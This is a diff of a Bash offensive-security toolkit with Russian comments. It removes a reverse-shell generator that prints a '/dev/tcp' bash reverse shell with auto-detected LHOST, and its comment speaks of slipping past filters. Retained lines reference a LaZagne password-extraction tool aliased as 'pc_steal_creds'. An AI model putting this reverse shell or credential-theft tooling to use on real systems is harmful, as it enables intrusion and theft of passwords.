@@ -2165,7 +2165,6 @@ get_tool_info() {
         "run_deep_audit")           echo "Smart Audit: глубокая проверка безопасности текущей системы." ;;
 
         # --- Подменю: PC_RECOVERY & EXPLOIT (уже были) ---
-        "pc_gen_payload")           echo "Генерация реверс-шеллов (Bash/Python). Авто-настройка LHOST." ;;
         "run_pc_recovery_ultimate") echo "Сброс паролей Win/Lin/Mac и извлечение данных (LaZagne)." ;;
         "run_forensic_scanner")     echo "Автономная защита: килл-процессов, блок портов, карантин." ;;
 
@@ -2827,33 +2826,6 @@ run_system_pulse() {
 
 
 
-# Вспомогательные функции-мостики (для чистоты кода)
-pc_gen_payload() {
-    # Слой 1: Заголовок через Голос [1]
-    core_engine_ui "PAYLOAD GENERATOR"
-
-    # Слой 2: Автоматическое определение LHOST (без ifconfig/awk)
-    # Используем логику из узла [12] для получения активного IP
-    local l_ip=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+' || echo "127.0.0.1")
-    
-    echo -e "${Y}Detected LHOST:${NC} $l_ip"
-
-    # Слой 3: Защищенный ввод порта через Органы чувств [3] и Мозг [5]
-    local l_port=$(core_engine_input "select" "Enter LPORT (Default: 4444)")
-    [[ -z "$l_port" ]] && l_port="4444"
-
-    # Слой 4: Синхронизация через узел [13]
-    core_engine_progress 3 "COMPILING REVERSE SHELL"
-
-    # Слой 5: Вывод результата (Стерильный поток)
-    echo -e "\n${G}RAW BASH:${NC}"
-    # Мутируем только ключевые слова для обхода простейших фильтров через узел [4]
-    local cmd="bash -i >& /dev/tcp/$l_ip/$l_port 0>&1"
-    echo -e "${W}$cmd${NC}\n"
-
-    # Финализация через Барьер [9]
-    core_engine_wait
-}
 
 # Редиректы на существующие модули, чтобы не дублировать код
 pc_steal_creds() { run_pc_recovery_ultimate; }
